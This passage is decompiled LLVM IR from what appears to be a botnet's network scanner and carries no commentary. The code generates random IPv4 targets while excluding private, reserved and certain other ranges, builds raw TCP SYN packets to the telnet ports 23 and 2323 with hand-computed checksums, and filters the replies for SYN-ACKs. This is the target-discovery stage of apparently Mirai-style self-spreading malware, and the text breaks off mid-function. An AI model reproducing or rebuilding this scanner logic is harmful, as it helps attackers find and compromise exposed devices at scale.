  %v1_804f21f = call i32 @rand_next(i32 %stack_var_-1892.1)
  %v2_804f21f = trunc i32 %v1_804f21f to i16
  store i16 %v2_804f21f, i16* bitcast (i32* @global_var_8057d64.56 to i16*), align 4
  %v0_804f22a = load i32, i32* @global_var_805a858.27, align 8
  store i32 %v0_804f22a, i32* %eax.global-to-local, align 4
  store i32 %v0_804f22a, i32* @global_var_8057d6c.95, align 4
  br label %dec_label_pc_804f234

dec_label_pc_804f234:                             ; preds = %dec_label_pc_804f58f, %dec_label_pc_804f294, %dec_label_pc_804f57d, %dec_label_pc_804f566, %dec_label_pc_804f54b, %dec_label_pc_804f530, %dec_label_pc_804f2ea, %dec_label_pc_804f2e1, %dec_label_pc_804f2d8, %dec_label_pc_804f2cf, %dec_label_pc_804f2c6, %dec_label_pc_804f2bd, %dec_label_pc_804f2b4, %dec_label_pc_804f2af, %dec_label_pc_804f2aa, %dec_label_pc_804f2a5, %dec_label_pc_804f2a0, %dec_label_pc_804f299, %dec_label_pc_804f262, %dec_label_pc_804f25d, %dec_label_pc_804f256, %dec_label_pc_804f252, %dec_label_pc_804f24e, %dec_label_pc_804f234, %dec_label_pc_804f1f3
  %v1_804f234 = call i32 @rand_next(i32 %stack_var_-1892.1)
  store i32 %v1_804f234, i32* %eax.global-to-local, align 4
  %sext2 = mul i32 %v1_804f234, 65536
  %v1_804f239 = sdiv i32 %sext2, 65536
  %v2_804f23f = urem i32 %v1_804f234, 256
  %v3_804f23f = load i32, i32* @edx, align 4
  %v4_804f23f = and i32 %v3_804f23f, -256
  %v5_804f23f = or i32 %v4_804f23f, %v2_804f23f
  store i32 %v5_804f23f, i32* %edx.global-to-local, align 4
  %v2_804f241 = udiv i32 %v1_804f239, 256
  store i32 %v2_804f241, i32* %ecx.global-to-local, align 4
  %v2_804f244 = udiv i32 %v1_804f239, 65536
  store i32 %v2_804f244, i32* @edi, align 4
  %v2_804f247 = udiv i32 %v1_804f239, 16777216
  store i32 %v2_804f247, i32* @ebx, align 4
  %v2_804f24a = trunc i32 %v1_804f234 to i8
  %v11_804f24a = icmp eq i8 %v2_804f24a, 127
  br i1 %v11_804f24a, label %dec_label_pc_804f234, label %dec_label_pc_804f24e

dec_label_pc_804f24e:                             ; preds = %dec_label_pc_804f234
  %v6_804f24e = icmp eq i8 %v2_804f24a, 0
  br i1 %v6_804f24e, label %dec_label_pc_804f234, label %dec_label_pc_804f252

dec_label_pc_804f252:                             ; preds = %dec_label_pc_804f24e
  %v11_804f252 = icmp eq i8 %v2_804f24a, 3
  br i1 %v11_804f252, label %dec_label_pc_804f234, label %dec_label_pc_804f256

dec_label_pc_804f256:                             ; preds = %dec_label_pc_804f252
  %v2_804f256 = add nsw i32 %v1_804f239, -15
  store i32 %v2_804f256, i32* %eax.global-to-local, align 4
  %v1_804f259 = trunc i32 %v2_804f256 to i8
  %tmp300 = or i8 %v1_804f259, 1
  %tmp301 = icmp eq i8 %tmp300, 1
  br i1 %tmp301, label %dec_label_pc_804f234, label %dec_label_pc_804f25d

dec_label_pc_804f25d:                             ; preds = %dec_label_pc_804f256
  %v10_804f25d = icmp eq i8 %v2_804f24a, 56
  br i1 %v10_804f25d, label %dec_label_pc_804f234, label %dec_label_pc_804f262

dec_label_pc_804f262:                             ; preds = %dec_label_pc_804f25d
  %v10_804f262 = icmp eq i8 %v2_804f24a, 10
  br i1 %v10_804f262, label %dec_label_pc_804f234, label %dec_label_pc_804f267

dec_label_pc_804f267:                             ; preds = %dec_label_pc_804f262
  %v8_804f267 = icmp eq i8 %v2_804f24a, -64
  br i1 %v8_804f267, label %dec_label_pc_804f530, label %dec_label_pc_804f270

dec_label_pc_804f270:                             ; preds = %dec_label_pc_804f267
  %v11_804f270 = icmp eq i8 %v2_804f24a, -84
  br i1 %v11_804f270, label %dec_label_pc_804f574, label %dec_label_pc_804f279

dec_label_pc_804f279:                             ; preds = %dec_label_pc_804f270
  %v10_804f279 = icmp eq i8 %v2_804f24a, 100
  br i1 %v10_804f279, label %dec_label_pc_804f542, label %dec_label_pc_804f282

dec_label_pc_804f282:                             ; preds = %dec_label_pc_804f279
  %v11_804f282 = icmp eq i8 %v2_804f24a, -87
  br i1 %v11_804f282, label %dec_label_pc_804f58f, label %dec_label_pc_804f28b

dec_label_pc_804f28b.thread:                      ; preds = %dec_label_pc_804f57d, %dec_label_pc_804f282.thread
  br label %dec_label_pc_804f294.thread

dec_label_pc_804f28b:                             ; preds = %dec_label_pc_804f282
  %v11_804f28b = icmp eq i8 %v2_804f24a, -58
  br i1 %v11_804f28b, label %dec_label_pc_804f55d, label %dec_label_pc_804f294

dec_label_pc_804f294.thread:                      ; preds = %dec_label_pc_804f28b.thread, %dec_label_pc_804f58f, %dec_label_pc_804f554.thread
  br label %dec_label_pc_804f299

dec_label_pc_804f294:                             ; preds = %dec_label_pc_804f28b
  %tmp302 = icmp ult i8 %v2_804f24a, -32
  br i1 %tmp302, label %dec_label_pc_804f299, label %dec_label_pc_804f234

dec_label_pc_804f299:                             ; preds = %dec_label_pc_804f294.thread, %dec_label_pc_804f566, %dec_label_pc_804f294, %dec_label_pc_804f574, %dec_label_pc_804f55d, %dec_label_pc_804f542
  %v1_804f299 = add i32 %v5_804f23f, -6
  store i32 %v1_804f299, i32* %eax.global-to-local, align 4
  %v1_804f29c = trunc i32 %v1_804f299 to i8
  %tmp303 = or i8 %v1_804f29c, 1
  %tmp304 = icmp eq i8 %tmp303, 1
  br i1 %tmp304, label %dec_label_pc_804f234, label %dec_label_pc_804f2a0

dec_label_pc_804f2a0:                             ; preds = %dec_label_pc_804f299
  %v10_804f2a0 = icmp eq i8 %v2_804f24a, 11
  br i1 %v10_804f2a0, label %dec_label_pc_804f234, label %dec_label_pc_804f2a5

dec_label_pc_804f2a5:                             ; preds = %dec_label_pc_804f2a0
  %v10_804f2a5 = icmp eq i8 %v2_804f24a, 21
  br i1 %v10_804f2a5, label %dec_label_pc_804f234, label %dec_label_pc_804f2aa

dec_label_pc_804f2aa:                             ; preds = %dec_label_pc_804f2a5
  %v10_804f2aa = icmp eq i8 %v2_804f24a, 22
  br i1 %v10_804f2aa, label %dec_label_pc_804f234, label %dec_label_pc_804f2af

dec_label_pc_804f2af:                             ; preds = %dec_label_pc_804f2aa
  %v10_804f2af = icmp eq i8 %v2_804f24a, 26
  br i1 %v10_804f2af, label %dec_label_pc_804f234, label %dec_label_pc_804f2b4

dec_label_pc_804f2b4:                             ; preds = %dec_label_pc_804f2af
  %v10_804f2b4 = icmp eq i8 %v2_804f24a, 28
  br i1 %v10_804f2b4, label %dec_label_pc_804f234, label %dec_label_pc_804f2bd

dec_label_pc_804f2bd:                             ; preds = %dec_label_pc_804f2b4
  %v10_804f2bd = icmp eq i8 %v2_804f24a, 29
  br i1 %v10_804f2bd, label %dec_label_pc_804f234, label %dec_label_pc_804f2c6

dec_label_pc_804f2c6:                             ; preds = %dec_label_pc_804f2bd
  %v10_804f2c6 = icmp eq i8 %v2_804f24a, 30
  br i1 %v10_804f2c6, label %dec_label_pc_804f234, label %dec_label_pc_804f2cf

dec_label_pc_804f2cf:                             ; preds = %dec_label_pc_804f2c6
  %v10_804f2cf = icmp eq i8 %v2_804f24a, 33
  br i1 %v10_804f2cf, label %dec_label_pc_804f234, label %dec_label_pc_804f2d8

dec_label_pc_804f2d8:                             ; preds = %dec_label_pc_804f2cf
  %v10_804f2d8 = icmp eq i8 %v2_804f24a, 55
  br i1 %v10_804f2d8, label %dec_label_pc_804f234, label %dec_label_pc_804f2e1

dec_label_pc_804f2e1:                             ; preds = %dec_label_pc_804f2d8
  %v11_804f2e1 = icmp eq i8 %v2_804f24a, -42
  br i1 %v11_804f2e1, label %dec_label_pc_804f234, label %dec_label_pc_804f2ea

dec_label_pc_804f2ea:                             ; preds = %dec_label_pc_804f2e1
  %v11_804f2ea = icmp eq i8 %v2_804f24a, -41
  br i1 %v11_804f2ea, label %dec_label_pc_804f234, label %dec_label_pc_804f2f3

dec_label_pc_804f2f3:                             ; preds = %dec_label_pc_804f2ea
  store i16 0, i16* bitcast (i32* @global_var_8057d6a.96 to i16*), align 4
  %v2_804f2fe = mul i32 %v1_804f234, 16777216
  store i32 %v2_804f2fe, i32* %edx.global-to-local, align 4
  %v1_804f301 = mul i32 %v2_804f241, 65536
  %v2_804f303 = and i32 %v1_804f301, 16711680
  store i32 %v2_804f303, i32* %eax.global-to-local, align 4
  %v1_804f306 = load i32, i32* @esp, align 4
  %v2_804f306 = add i32 %v1_804f306, -4
  %v3_804f306 = inttoptr i32 %v2_804f306 to i32*
  store i32 %v2_804f241, i32* %v3_804f306, align 4
  %v0_804f307 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f307 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f307 = or i32 %v1_804f307, %v0_804f307
  store i32 %v2_804f307, i32* %edx.global-to-local, align 4
  %v0_804f30b = load i32, i32* @ebx, align 4
  %v1_804f30b = urem i32 %v0_804f30b, 256
  store i32 %v1_804f30b, i32* %eax.global-to-local, align 4
  %v0_804f30d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f30d = add i32 %v1_804f306, -8
  %v3_804f30d = inttoptr i32 %v2_804f30d to i32*
  store i32 %v0_804f30d, i32* %v3_804f30d, align 4
  %v0_804f30e = load i32, i32* %edx.global-to-local, align 4
  %v1_804f30e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f30e = or i32 %v1_804f30e, %v0_804f30e
  store i32 %v2_804f30e, i32* %edx.global-to-local, align 4
  %v0_804f310 = load i32, i32* @edi, align 4
  %v1_804f312 = urem i32 %v0_804f310, 256
  store i32 %v1_804f312, i32* %eax.global-to-local, align 4
  %v1_804f317 = add i32 %v1_804f306, -12
  %v2_804f317 = inttoptr i32 %v1_804f317 to i32*
  store i32 20, i32* %v2_804f317, align 4
  %v0_804f319 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f319 = mul i32 %v0_804f319, 256
  store i32 %v2_804f319, i32* %eax.global-to-local, align 4
  %v1_804f31c = add i32 %v1_804f306, -16
  %v2_804f31c = inttoptr i32 %v1_804f31c to i32*
  store i32 ptrtoint (i32* @global_var_8057d60.53 to i32), i32* %v2_804f31c, align 4
  %v0_804f321 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f321 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f321 = or i32 %v1_804f321, %v0_804f321
  %v1_804f323 = trunc i32 %v2_804f321 to i16
  %v2_804f323 = call i16 @llvm.bswap.i16(i16 %v1_804f323)
  %v3_804f323 = zext i16 %v2_804f323 to i32
  %v1_804f327 = udiv i32 %v2_804f321, 65536
  %v2_804f327 = mul nuw i32 %v3_804f323, 65536
  %v1_804f32a = trunc i32 %v1_804f327 to i16
  %v2_804f32a = call i16 @llvm.bswap.i16(i16 %v1_804f32a)
  %v3_804f32a = zext i16 %v2_804f32a to i32
  %v6_804f32a = or i32 %v3_804f32a, %v2_804f327
  store i32 %v6_804f32a, i32* %edx.global-to-local, align 4
  store i32 %v6_804f32a, i32* @global_var_8057d70.97, align 16
  %v2_804f334 = inttoptr i32 %stack_var_-1892.1 to i16*
  %v3_804f334 = call i32 @checksum_generic(i16* %v2_804f334, i32 %stack_var_-1888.1)
  %v4_804f334 = trunc i32 %v3_804f334 to i16
  store i32 %v3_804f334, i32* %eax.global-to-local, align 4
  %v0_804f339 = load i32, i32* @esp, align 4
  %v1_804f339 = add i32 %v0_804f339, 1888
  %v2_804f339 = inttoptr i32 %v1_804f339 to i32*
  %v3_804f339 = load i32, i32* %v2_804f339, align 4
  store i16 %v4_804f334, i16* bitcast (i32* @global_var_8057d6a.96 to i16*), align 4
  %v1_804f34b = add i32 %v0_804f339, 16
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_804f352 = ashr i32 %v3_804f339, 31
  %v2_804f355 = zext i32 %v3_804f339 to i64
  %v4_804f355 = zext i32 %v2_804f352 to i64
  %v5_804f355 = mul nuw i64 %v4_804f355, 4294967296
  %v6_804f355 = or i64 %v5_804f355, %v2_804f355
  %v8_804f355 = sdiv i64 %v6_804f355, 10
  %v9_804f355 = trunc i64 %v8_804f355 to i32
  store i32 %v9_804f355, i32* %eax.global-to-local, align 4
  %v10_804f355 = srem i64 %v6_804f355, 10
  %v11_804f355 = trunc i64 %v10_804f355 to i32
  store i32 %v11_804f355, i32* %edx.global-to-local, align 4
  %v1_804f357 = icmp eq i32 %v11_804f355, 0
  br i1 %v1_804f357, label %dec_label_pc_804f5a7, label %dec_label_pc_804f368

dec_label_pc_804f368:                             ; preds = %dec_label_pc_804f2f3, %dec_label_pc_804f5a7
  %v0_804f36d = phi i32 [ %v0_804f36d.pre, %dec_label_pc_804f5a7 ], [ %v1_804f34b, %dec_label_pc_804f2f3 ]
  %stack_var_-1892.2 = phi i32 [ %stack_var_-1892.4, %dec_label_pc_804f5a7 ], [ %stack_var_-1892.1, %dec_label_pc_804f2f3 ]
  %stack_var_-1888.2 = phi i32 [ %stack_var_-1888.4, %dec_label_pc_804f5a7 ], [ %stack_var_-1888.1, %dec_label_pc_804f2f3 ]
  %storemerge = phi i16 [ 4873, %dec_label_pc_804f5a7 ], [ 5888, %dec_label_pc_804f2f3 ]
  store i16 %storemerge, i16* @global_var_8057d76.59, align 2
  %v0_804f368 = load i32, i32* @global_var_8057d70.97, align 16
  store i32 %v0_804f368, i32* %eax.global-to-local, align 4
  %v1_804f36d = add i32 %v0_804f36d, -4
  %v2_804f36d = inttoptr i32 %v1_804f36d to i32*
  store i32 20, i32* %v2_804f36d, align 4
  %v0_804f36f = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804f36f, i32* @global_var_8057d78.98, align 8
  %v1_804f374 = add i32 %v0_804f36d, -8
  %v2_804f374 = inttoptr i32 %v1_804f374 to i32*
  store i32 5120, i32* %v2_804f374, align 4
  store i16 0, i16* bitcast (i32* @global_var_8057d84.99 to i16*), align 4
  %v1_804f382 = add i32 %v0_804f36d, -12
  %v2_804f382 = inttoptr i32 %v1_804f382 to i32*
  store i32 ptrtoint (i32* @global_var_8057d74.60 to i32), i32* %v2_804f382, align 4
  %v1_804f387 = add i32 %v0_804f36d, -16
  %v2_804f387 = inttoptr i32 %v1_804f387 to i32*
  store i32 ptrtoint (i32* @global_var_8057d60.53 to i32), i32* %v2_804f387, align 4
  %v3_804f38c = inttoptr i32 %stack_var_-1888.2 to i16*
  %v4_804f38c = call i32 @checksum_tcpudp(i32 %stack_var_-1892.2, i16* %v3_804f38c, i32 ptrtoint (i32* @0 to i32))
  %v5_804f38c = trunc i32 %v4_804f38c to i16
  store i16 %v5_804f38c, i16* bitcast (i32* @global_var_8057d84.99 to i16*), align 4
  %v0_804f397 = load i32, i32* @global_var_8057d70.97, align 16
  store i32 %v0_804f397, i32* %eax.global-to-local, align 4
  %v1_804f39c = load i32, i32* @esp, align 4
  %v2_804f39c = add i32 %v1_804f39c, 1848
  %v3_804f39c = inttoptr i32 %v2_804f39c to i32*
  store i32 %v0_804f397, i32* %v3_804f39c, align 4
  %v0_804f3a3 = load i16, i16* @global_var_8057d76.59, align 2
  %v1_804f3a3 = zext i16 %v0_804f3a3 to i32
  %v2_804f3a3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804f3a3 = and i32 %v2_804f3a3, -65536
  %v4_804f3a3 = or i32 %v3_804f3a3, %v1_804f3a3
  store i32 %v4_804f3a3, i32* %eax.global-to-local, align 4
  %v0_804f3a9 = load i32, i32* @esp, align 4
  %v1_804f3a9 = add i32 %v0_804f3a9, 1844
  %v2_804f3a9 = inttoptr i32 %v1_804f3a9 to i16*
  store i16 2, i16* %v2_804f3a9, align 2
  %v0_804f3b3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3b3 = trunc i32 %v0_804f3b3 to i16
  %v2_804f3b3 = load i32, i32* @esp, align 4
  %v3_804f3b3 = add i32 %v2_804f3b3, 1846
  %v4_804f3b3 = inttoptr i32 %v3_804f3b3 to i16*
  store i16 %v1_804f3b3, i16* %v4_804f3b3, align 2
  %v0_804f3bb = load i32, i32* @esp, align 4
  %v1_804f3bb = inttoptr i32 %v0_804f3bb to i32*
  %v2_804f3bb = load i32, i32* %v1_804f3bb, align 4
  store i32 %v2_804f3bb, i32* %eax.global-to-local, align 4
  %v3_804f3bb = add i32 %v0_804f3bb, 4
  %v1_804f3bc = inttoptr i32 %v3_804f3bb to i32*
  %v2_804f3bc = load i32, i32* %v1_804f3bc, align 4
  store i32 %v2_804f3bc, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_804f3bc, align 4
  %v1_804f3bf = add i32 %v0_804f3bb, 1844
  store i32 %v1_804f3bf, i32* %v1_804f3bb, align 4
  %v0_804f3c7 = load i32, i32* @global_var_805a874.52, align 4
  store i32 %v0_804f3c7, i32* %eax.global-to-local, align 4
  %v1_804f3cc = add i32 %v0_804f3bb, -4
  %v2_804f3cc = inttoptr i32 %v1_804f3cc to i32*
  store i32 16384, i32* %v2_804f3cc, align 4
  %v1_804f3d1 = add i32 %v0_804f3bb, -8
  %v2_804f3d1 = inttoptr i32 %v1_804f3d1 to i32*
  store i32 40, i32* %v2_804f3d1, align 4
  %v1_804f3d3 = add i32 %v0_804f3bb, -12
  %v2_804f3d3 = inttoptr i32 %v1_804f3d3 to i32*
  store i32 ptrtoint (i32* @global_var_8057d60.53 to i32), i32* %v2_804f3d3, align 4
  %v0_804f3d8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f3d8 = add i32 %v0_804f3bb, -16
  %v3_804f3d8 = inttoptr i32 %v2_804f3d8 to i32*
  store i32 %v0_804f3d8, i32* %v3_804f3d8, align 4
  %v6_804f3d9 = call i32 @__libc_sendto(i32 %stack_var_-1892.2, i32 %stack_var_-1888.2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804f3d9, i32* %eax.global-to-local, align 4
  %v0_804f3de = load i32, i32* @esp, align 4
  %v1_804f3de = add i32 %v0_804f3de, 1904
  %v2_804f3de = inttoptr i32 %v1_804f3de to i32*
  %v3_804f3de = load i32, i32* %v2_804f3de, align 4
  %v1_804f3e5 = add i32 %v3_804f3de, 1
  store i32 %v1_804f3e5, i32* %eax.global-to-local, align 4
  store i32 %v1_804f3e5, i32* %v2_804f3de, align 4
  %v0_804f3ed = load i32, i32* @esp, align 4
  %v1_804f3ed = add i32 %v0_804f3ed, 32
  %v0_804f3f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f3f0 = add i32 %v0_804f3f0, -383
  %v6_804f3f0 = sub i32 382, %v0_804f3f0
  %v7_804f3f0 = and i32 %v6_804f3f0, %v0_804f3f0
  %v8_804f3f0 = icmp slt i32 %v7_804f3f0, 0
  %v9_804f3f0 = icmp eq i32 %v1_804f3f0, 0
  %v10_804f3f0 = icmp slt i32 %v1_804f3f0, 0
  %v3_804f3f5 = icmp ne i1 %v10_804f3f0, %v8_804f3f0
  %v4_804f3f5 = or i1 %v9_804f3f0, %v3_804f3f5
  br i1 %v4_804f3f5, label %dec_label_pc_804f1f3, label %dec_label_pc_804f3fb

dec_label_pc_804f3fb:                             ; preds = %dec_label_pc_804f368
  %v0_804f3fb = load i32, i32* @esi, align 4
  %v2_804f3fb = add i32 %v0_804f3ed, 64
  %v3_804f3fb = inttoptr i32 %v2_804f3fb to i32*
  store i32 %v0_804f3fb, i32* %v3_804f3fb, align 4
  br label %dec_label_pc_804f3ff

dec_label_pc_804f3ff:                             ; preds = %dec_label_pc_804f1d8, %dec_label_pc_804f3fb
  %stack_var_-1892.3 = phi i32 [ %stack_var_-1892.2, %dec_label_pc_804f3fb ], [ %stack_var_-1892.0, %dec_label_pc_804f1d8 ]
  %stack_var_-1888.3 = phi i32 [ %stack_var_-1888.2, %dec_label_pc_804f3fb ], [ %stack_var_-1888.0, %dec_label_pc_804f1d8 ]
  %v2_804f3ff = call i32 @__GI___errno_location(i32 %stack_var_-1892.3, i32 %stack_var_-1888.3)
  store i32 %v2_804f3ff, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804f406 = load i32, i32* @esp, align 4
  %v2_804f406 = add i32 %v1_804f406, 40
  %v3_804f406 = inttoptr i32 %v2_804f406 to i32*
  store i32 %v2_804f3ff, i32* %v3_804f406, align 4
  br label %dec_label_pc_804f40a

dec_label_pc_804f40a:                             ; preds = %dec_label_pc_804f4a2, %dec_label_pc_804f49a, %dec_label_pc_804f492, %dec_label_pc_804f48a, %dec_label_pc_804f482, %dec_label_pc_804f476, %dec_label_pc_804f46f, %dec_label_pc_804f45d, %dec_label_pc_804f451, %dec_label_pc_804f44c, %dec_label_pc_804f51c, %dec_label_pc_804f3ff
  %v0_804f40a = load i32, i32* @esp, align 4
  %v1_804f40a = add i32 %v0_804f40a, 40
  %v2_804f40a = inttoptr i32 %v1_804f40a to i32*
  %v3_804f40a = load i32, i32* %v2_804f40a, align 4
  store i32 %v3_804f40a, i32* %edx.global-to-local, align 4
  %v1_804f40e = inttoptr i32 %v3_804f40a to i32*
  store i32 0, i32* %v1_804f40e, align 4
  %v0_804f414 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f414 = load i32, i32* @esp, align 4
  %v2_804f414 = add i32 %v1_804f414, -4
  %v3_804f414 = inttoptr i32 %v2_804f414 to i32*
  store i32 %v0_804f414, i32* %v3_804f414, align 4
  %v0_804f415 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f415 = add i32 %v1_804f414, -8
  %v3_804f415 = inttoptr i32 %v2_804f415 to i32*
  store i32 %v0_804f415, i32* %v3_804f415, align 4
  %v1_804f416 = add i32 %v1_804f414, -12
  %v2_804f416 = inttoptr i32 %v1_804f416 to i32*
  store i32 0, i32* %v2_804f416, align 4
  %v1_804f418 = add i32 %v1_804f414, -16
  %v2_804f418 = inttoptr i32 %v1_804f418 to i32*
  store i32 0, i32* %v2_804f418, align 4
  %v1_804f41a = add i32 %v1_804f414, -20
  %v2_804f41a = inttoptr i32 %v1_804f41a to i32*
  store i32 16384, i32* %v2_804f41a, align 4
  %v1_804f41f = add i32 %v1_804f414, -24
  %v2_804f41f = inttoptr i32 %v1_804f41f to i32*
  store i32 1514, i32* %v2_804f41f, align 4
  %v0_804f424 = load i32, i32* @global_var_805a874.52, align 4
  store i32 %v0_804f424, i32* %eax.global-to-local, align 4
  %v1_804f429 = add i32 %v1_804f414, 58
  store i32 %v1_804f429, i32* %ecx.global-to-local, align 4
  %v2_804f42d = add i32 %v1_804f414, -28
  %v3_804f42d = inttoptr i32 %v2_804f42d to i32*
  store i32 %v1_804f429, i32* %v3_804f42d, align 4
  %v0_804f42e = load i32, i32* %eax.global-to-local, align 4
  %v2_804f42e = add i32 %v1_804f414, -32
  %v3_804f42e = inttoptr i32 %v2_804f42e to i32*
  store i32 %v0_804f42e, i32* %v3_804f42e, align 4
  %v0_804f42f = call i32 @__libc_recvfrom()
  store i32 %v0_804f42f, i32* %eax.global-to-local, align 4
  %v0_804f434 = load i32, i32* @esp, align 4
  %tmp164 = icmp slt i32 %v0_804f42f, 1
  br i1 %tmp164, label %dec_label_pc_804f5b5, label %dec_label_pc_804f43f

dec_label_pc_804f43f:                             ; preds = %dec_label_pc_804f40a
  %v1_804f43f = add i32 %v0_804f434, 72
  %v2_804f43f = inttoptr i32 %v1_804f43f to i32*
  %v3_804f43f = load i32, i32* %v2_804f43f, align 4
  store i32 %v3_804f43f, i32* %edx.global-to-local, align 4
  %v1_804f443 = inttoptr i32 %v3_804f43f to i32*
  %v2_804f443 = load i32, i32* %v1_804f443, align 4
  %v11_804f443 = icmp eq i32 %v2_804f443, 11
  br i1 %v11_804f443, label %dec_label_pc_804f5b5, label %dec_label_pc_804f44c

dec_label_pc_804f44c:                             ; preds = %dec_label_pc_804f43f
  %tmp305 = icmp ult i32 %v0_804f42f, 40
  br i1 %tmp305, label %dec_label_pc_804f40a, label %dec_label_pc_804f451

dec_label_pc_804f451:                             ; preds = %dec_label_pc_804f44c
  %v1_804f451 = add i32 %v0_804f434, 106
  %v2_804f451 = inttoptr i32 %v1_804f451 to i32*
  %v3_804f451 = load i32, i32* %v2_804f451, align 4
  store i32 %v3_804f451, i32* %eax.global-to-local, align 4
  %v1_804f455 = load i32, i32* @global_var_805a858.27, align 8
  %v12_804f455 = icmp eq i32 %v3_804f451, %v1_804f455
  %v1_804f45b = icmp eq i1 %v12_804f455, false
  br i1 %v1_804f45b, label %dec_label_pc_804f40a, label %dec_label_pc_804f45d

dec_label_pc_804f45d:                             ; preds = %dec_label_pc_804f451
  %v1_804f45d = add i32 %v0_804f434, 99
  %v2_804f45d = inttoptr i32 %v1_804f45d to i8*
  %v3_804f45d = load i8, i8* %v2_804f45d, align 1
  %v12_804f45d = icmp eq i8 %v3_804f45d, 6
  %v1_804f462 = icmp eq i1 %v12_804f45d, false
  br i1 %v1_804f462, label %dec_label_pc_804f40a, label %dec_label_pc_804f464

dec_label_pc_804f464:                             ; preds = %dec_label_pc_804f45d
  %v1_804f464 = add i32 %v0_804f434, 110
  %v2_804f464 = inttoptr i32 %v1_804f464 to i32*
  %v3_804f464 = load i32, i32* %v2_804f464, align 4
  store i32 %v3_804f464, i32* @edi, align 4
  %v1_804f468 = trunc i32 %v3_804f464 to i16
  %v7_804f468 = icmp eq i16 %v1_804f468, 5888
  br i1 %v7_804f468, label %dec_label_pc_804f476, label %dec_label_pc_804f46f

dec_label_pc_804f46f:                             ; preds = %dec_label_pc_804f464
  %v10_804f46f = icmp eq i16 %v1_804f468, 4873
  %v1_804f474 = icmp eq i1 %v10_804f46f, false
  br i1 %v1_804f474, label %dec_label_pc_804f40a, label %dec_label_pc_804f476

dec_label_pc_804f476:                             ; preds = %dec_label_pc_804f46f, %dec_label_pc_804f464
  %v1_804f476 = add i32 %v0_804f434, 62
  %v2_804f476 = inttoptr i32 %v1_804f476 to i16*
  %v3_804f476 = load i16, i16* %v2_804f476, align 2
  %v4_804f476 = zext i16 %v3_804f476 to i32
  %v5_804f476 = load i32, i32* @ecx, align 4
  %v6_804f476 = and i32 %v5_804f476, -65536
  %v7_804f476 = or i32 %v6_804f476, %v4_804f476
  store i32 %v7_804f476, i32* %ecx.global-to-local, align 4
  %v1_804f47b = add i32 %v0_804f434, 112
  %v2_804f47b = inttoptr i32 %v1_804f47b to i16*
  %v3_804f47b = load i16, i16* %v2_804f47b, align 2
  %v16_804f47b = icmp eq i16 %v3_804f47b, %v3_804f476
  %v1_804f480 = icmp eq i1 %v16_804f47b, false
  br i1 %v1_804f480, label %dec_label_pc_804f40a, label %dec_label_pc_804f482

dec_label_pc_804f482:                             ; preds = %dec_label_pc_804f476
  %v1_804f482 = add i32 %v0_804f434, 123
  %v2_804f482 = inttoptr i32 %v1_804f482 to i8*
  %v3_804f482 = load i8, i8* %v2_804f482, align 1
  %v4_804f482 = zext i8 %v3_804f482 to i32
  %v6_804f482 = and i32 %v3_804f451, -256
  %v7_804f482 = or i32 %v4_804f482, %v6_804f482
  store i32 %v7_804f482, i32* %eax.global-to-local, align 4
  %v2_804f486 = and i8 %v3_804f482, 2
  %v3_804f486 = icmp eq i8 %v2_804f486, 0
  br i1 %v3_804f486, label %dec_label_pc_804f40a, label %dec_label_pc_804f48a

dec_label_pc_804f48a:                             ; preds = %dec_label_pc_804f482
  %v2_804f48a = and i32 %v4_804f482, 16
  %v3_804f48a = icmp eq i32 %v2_804f48a, 0
  br i1 %v3_804f48a, label %dec_label_pc_804f40a, label %dec_label_pc_804f492

dec_label_pc_804f492:                             ; preds = %dec_label_pc_804f48a
  %v2_804f492 = and i32 %v4_804f482, 4
  %v3_804f492 = icmp eq i32 %v2_804f492, 0
  %v1_804f494 = icmp eq i1 %v3_804f492, false
  br i1 %v1_804f494, label %dec_label_pc_804f40a, label %dec_label_pc_804f49a

dec_label_pc_804f49a:                             ; preds = %dec_label_pc_804f492
  %tmp320 = urem i8 %v3_804f482, 2
  %v3_804f49a = icmp eq i8 %tmp320, 0
  %v1_804f49c = icmp eq i1 %v3_804f49a, false
  br i1 %v1_804f49c, label %dec_label_pc_804f40a, label %dec_label_pc_804f4a2

dec_label_pc_804f4a2:                             ; preds = %dec_label_pc_804f49a
  %v1_804f4a2 = add i32 %v0_804f434, 102
  %v2_804f4a2 = inttoptr i32 %v1_804f4a2 to i32*
  %v3_804f4a2 = load i32, i32* %v2_804f4a2, align 4
  store i32 %v3_804f4a2, i32* @esi, align 4
  %v1_804f4a6 = add i32 %v0_804f434, 118
  %v2_804f4a6 = inttoptr i32 %v1_804f4a6 to i32*
  %v3_804f4a6 = load i32, i32* %v2_804f4a6, align 4
  %v1_804f4aa = trunc i32 %v3_804f4a6 to i16
  %v2_804f4aa = call i16 @llvm.bswap.i16(i16 %v1_804f4aa)
  %v3_804f4aa = zext i16 %v2_804f4aa to i32
  %v1_804f4ae = udiv i32 %v3_804f4a6, 65536
  %v2_804f4ae = mul nuw i32 %v3_804f4aa, 65536
  %v1_804f4b1 = trunc i32 %v1_804f4ae to i16
  %v2_804f4b1 = call i16 @llvm.bswap.i16(i16 %v1_804f4b1)
  %v3_804f4b1 = zext i16 %v2_804f4b1 to i32
  %v6_804f4b1 = or i32 %v3_804f4b1, %v2_804f4ae
  %v1_804f4b5 = add i32 %v6_804f4b1, -1
  %v1_804f4b6 = trunc i32 %v1_804f4b5 to i16
  %v2_804f4b6 = call i16 @llvm.bswap.i16(i16 %v1_804f4b6)
  %v3_804f4b6 = zext i16 %v2_804f4b6 to i32
  %v1_804f4ba = udiv i32 %v1_804f4b5, 65536
  %v2_804f4ba = mul nuw i32 %v3_804f4b6, 65536
